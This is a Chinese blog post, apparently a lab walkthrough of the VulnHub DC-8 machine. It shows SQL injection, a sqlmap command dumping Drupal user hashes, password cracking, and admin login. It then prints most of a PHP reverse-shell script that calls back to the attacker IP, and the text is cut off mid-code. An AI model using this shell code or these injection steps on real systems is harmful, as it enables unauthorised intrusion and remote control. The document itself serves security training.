@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="环境vulnhub https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-8,367&#x2F;靶机:172.16.17.149攻击机kali:172.16.17.140 描述 信息收集">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-dc8打靶">
+<meta property="og:url" content="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/index.html">
+<meta property="og:site_name" content="Syst1m">
+<meta property="og:description" content="环境vulnhub https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-8,367&#x2F;靶机:172.16.17.149攻击机kali:172.16.17.140 描述 信息收集">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171605915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171613764.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171616391.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171616126.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171624065.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171641368.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171644855.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171814251.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171809111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171816255.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171819787.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171856431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171825215.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171839142.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171842636.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171845121.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171857239.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171900511.png">
+<meta property="article:published_time" content="2022-06-16T11:48:19.000Z">
+<meta property="article:modified_time" content="2022-06-17T11:05:09.104Z">
+<meta property="article:author" content="Syst1m">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="Drupal">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png">
+
+
+<link rel="canonical" href="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/","path":"2022/06/16/vulnhub-dc8打靶/","title":"vulnhub-dc8打靶"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub-dc8打靶 | Syst1m</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Syst1m" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Syst1m</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Syst1m"
+      src="/images/IMG_0010.JPG">
+  <!--
+  <p class="site-author-name" itemprop="name">Syst1m</p>
+  -->
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chencicici" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chencicici" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1343369483@qq.com" title="E-Mail → mailto:1343369483@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.uodrad.top/" title="https:&#x2F;&#x2F;www.uodrad.top&#x2F;" rel="noopener" target="_blank">uodrad</a>
+        </li>
+    </ul>
+  </div>
+
+
+       <!--网易云插件-->
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1933503036&auto=0&height=66">
+      </iframe>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chencicici" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0010.JPG">
+      <meta itemprop="name" content="Syst1m">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub-dc8打靶 | Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub-dc8打靶
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-16 19:48:19" itemprop="dateCreated datePublished" datetime="2022-06-16T19:48:19+08:00">2022-06-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-17 19:05:09" itemprop="dateModified" datetime="2022-06-17T19:05:09+08:00">2022-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>靶机:172.16.17.149<br>攻击机kali:172.16.17.140</p>
+<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171605915.png"></p>
+<p>访问首页的时候发现一处url带id字样,打上一个单引号,发现报错<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171613764.png"></p>
+<p>尝试注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616391.png"></p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>##sql注入<br>丢到sqlmap跑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616126.png"></p>
+<p>跑出账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%sqlmap -u http://172.16.17.149/?nid=3 -D d7db -T <span class="built_in">users</span> --dump -C <span class="string">&quot;name,pass&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171624065.png"></p>
+<p>但是md5解不出,看到账号里有一个john,提示我们使用john工具<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171641368.png"></p>
+<p>跑出一个密码turtle</p>
+<p>从robots.txt知道后台地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171644855.png"></p>
+<p>尝试登录,john用户登录成功</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>一直翻翻翻,在下面这个url翻到一个功能点,可以执行php代码<br><a target="_blank" rel="noopener" href="http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure">http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure</a></p>
+<p>写反弹shell语句,需要注意,要再代码前面添加一些字符串,不然不会被执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171814251.png"></p>
+<p>webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">9999</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span 